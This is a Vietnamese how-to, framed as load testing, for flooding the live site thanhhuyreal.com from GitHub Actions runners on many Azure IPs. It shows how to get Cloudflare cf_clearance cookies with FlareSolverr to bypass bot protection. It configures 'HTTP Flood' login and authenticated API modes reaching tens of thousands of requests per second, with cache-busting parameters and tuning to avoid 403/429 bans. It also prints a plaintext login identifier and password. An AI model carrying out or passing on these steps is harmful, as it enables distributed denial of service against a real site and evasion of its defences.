# Load Testing với GitHub Actions - thanhhuyreal.com

## Tổng quan

Test tải phân tán từ nhiều IP Azure khác nhau, tấn công vào **thanhhuyreal.com** qua Cloudflare với cơ chế bypass.

---

## Bước 1: Lấy cf_clearance Cookie

### Sử dụng FlareSolverr

```bash
# 1. Chạy FlareSolverr (Docker)
docker run -d \
  --name=flaresolverr \
  -p 8191:8191 \
  ghcr.io/flaresolverr/flaresolverr:latest

# 2. Gọi API để lấy cookie
curl -X POST http://localhost:8191/v1 \
  -H "Content-Type: application/json" \
  -d '{
    "cmd": "request.get",
    "url": "https://thanhhuyreal.com",
    "maxTimeout": 60000
  }' | jq -r '.solution.cookies[] | select(.name=="cf_clearance") | .value'
```

### Hoặc dùng Browser Extension

1. Cài extension: **Cookie Editor** (Chrome/Firefox)
2. Vào https://thanhhuyreal.com
3. Mở Cookie Editor → tìm `cf_clearance`
4. Copy giá trị (dài ~500 ký tự)

**Lưu ý:** Cookie expire sau ~30 phút, cần lấy lại trước mỗi lần chạy!

---

## Bước 2: Chạy trên GitHub Actions

### Vào GitHub Repository → Actions → "HTTP Flood — thanhhuyreal"

### Mode 1: Login Flood (Nhẹ - Test login endpoint)

```yaml
Mode: login_flood
Runners: 5
Max VUs: 2000
Stages: (để trống = dùng mặc định)
cf_clearance: <paste cookie ở đây>
cf_ua: (để mặc định)
php_identifier: lonussystem
php_password: lonussystem123@
```

**Tải tạo:**
- 5 runners × 2000 VUs = **10,000 VUs đồng thời**
- Mỗi VU: GET login page → POST login (2 requests/iteration)
- Mặc định: 30s:50, 60s:200, 60s:500, 360m:500 (rps/runner)
- **Total peak:** ~2,500 login requests/second

**Mục tiêu:**
- Test login endpoint chịu tải
- Test CSRF token generation
- Test Cloudflare rate limit
- Detect ban threshold (403/429)

---

### Mode 2: Auth API Flood (Nặng - Test toàn bộ hệ thống)

```yaml
Mode: auth_api_flood
Runners: 5
Max VUs: 5000
Stages: (để trống = dùng mặc định)
cf_clearance: <paste cookie ở đây>
cf_ua: (để mặc định)
php_identifier: lonussystem
php_password: lonussystem123@
```

**Tải tạo:**
- 5 runners × 5000 VUs = **25,000 VUs đồng thời**
- Login 1 lần trong `setup()`, sau đó flood:
  - 10 HEAVY_PAGES (search, listing, detail pages)
  - 3 HEAVY_APIS (POST endpoints)
- Mặc định: 30s:200, 60s:1000, 60s:3000, 360m:3000 (rps/runner)
- **Total peak:** ~15,000 requests/second

**Mục tiêu:**
- Test database performance (random queries)
- Test cache bypass (random params)
- Test backend API
- Test session management dưới tải cao

---

## Bước 3: Theo dõi kết quả

### Trên GitHub Actions UI:
- Xem IP của mỗi runner
- Xem live logs: request success/fail, RPS, latency
- Detect ban: `php_429`, `php_403`, `php_banned_rate`

### Metrics quan trọng:

**Login Flood:**
```
php_login_ok          # Login thành công
php_login_denied      # Sai password / không tồn tại
php_403 / php_429     # Bị ban/rate limit
php_login_duration    # Thời gian login (ms)
php_login_ok_rate     # Tỷ lệ thành công
```

**Auth API Flood:**
```
req_2xx               # Success requests
req_5xx               # Server errors
error_rate            # Tỷ lệ lỗi tổng
req_duration          # Latency trung bình
```

---

## Bước 4: Phân tích kết quả

### Thành công nếu:
✅ `error_rate < 0.9` (cho phép 90% error rate - stress test)
✅ Không có `req_timeout` quá nhiều
✅ Website vẫn phản hồi từ browser thật

### Server quá tải nếu:
❌ `req_5xx` tăng đột biến
❌ `req_duration` > 30s
❌ `req_timeout_rate` > 0.5
❌ Website không load được

### Bị ban nếu:
❌ `php_403` hoặc `php_429` > 50%
❌ `php_banned_rate` cao
❌ Tất cả requests trả về 403

---

## Override Stages (Nâng cao)

### Ví dụ Stages custom:

**Quick test (5 phút):**
```
10s:100,30s:500,60s:1000,3m:1000
```

**Stress test (1 giờ):**
```
1m:500,5m:2000,10m:5000,44m:5000
```

**Soak test (6 giờ - max GitHub Actions):**
```
30s:1000,1m:3000,358m:3000
```

Format: `<duration>:<target_rps>`
- Duration: 10s, 1m, 1h
- Target: số requests/giây mỗi runner

---

## Troubleshooting

### 1. Login thất bại (status=0)
```
time="..." level=error msg="GET login page that bai: status=0"
```
**Nguyên nhân:** `cf_clearance` hết hạn hoặc sai User-Agent

**Giải pháp:**
1. Lấy lại `cf_clearance` mới từ FlareSolverr
2. Đảm bảo `cf_ua` khớp với lúc lấy cookie

### 2. Login thất bại (403 Forbidden)
```
php_403 tăng cao
```
**Nguyên nhân:** Cloudflare chặn vì pattern spam

**Giải pháp:**
1. Giảm `runners` (5 → 3)
2. Giảm `max_vus` (2000 → 1000)
3. Thêm `REQUEST_DELAY` trong stages

### 3. Login denied (sai password)
```
php_login_denied tăng
```
**Nguyên nhân:** Credentials sai

**Giải pháp:**
1. Kiểm tra `php_identifier` / `php_password`
2. Test login thủ công trên web trước

### 4. Timeout requests
```
req_timeout_rate > 0.5
```
**Nguyên nhân:** Server quá tải hoặc không phản hồi

**Giải pháp:**
1. Giảm tải: `max_vus` / `runners`
2. Tăng timeout: `REQUEST_TIMEOUT=60s`

---

## Best Practices

### ✅ Nên:
- Lấy `cf_clearance` mới trước mỗi lần test (<30 phút)
- Bắt đầu với runners nhỏ (2-3) để test
- Tăng dần tải (ramp-up)
- Theo dõi server metrics (CPU, RAM, DB)
- Test ngoài giờ cao điểm

### ❌ Không nên:
- Dùng `cf_clearance` cũ >30 phút
- Chạy quá nhiều runners cùng lúc (>10)
- Để test chạy >6 giờ (GitHub timeout)
- Test trong giờ cao điểm thật

---

## Ví dụ Tải Tối Đa

### Setup cực mạnh:
```yaml
Mode: auth_api_flood
Runners: 10
Max VUs: 8000
Stages: 1m:1000,5m:5000,54m:5000
```

**Kết quả:**
- 10 runners × 8000 VUs = **80,000 VUs**
- Peak: ~50,000 requests/second
- Distributed từ 10 IP Azure khác nhau

**Cảnh báo:** Có thể làm sập server! Chỉ dùng trên prod test.
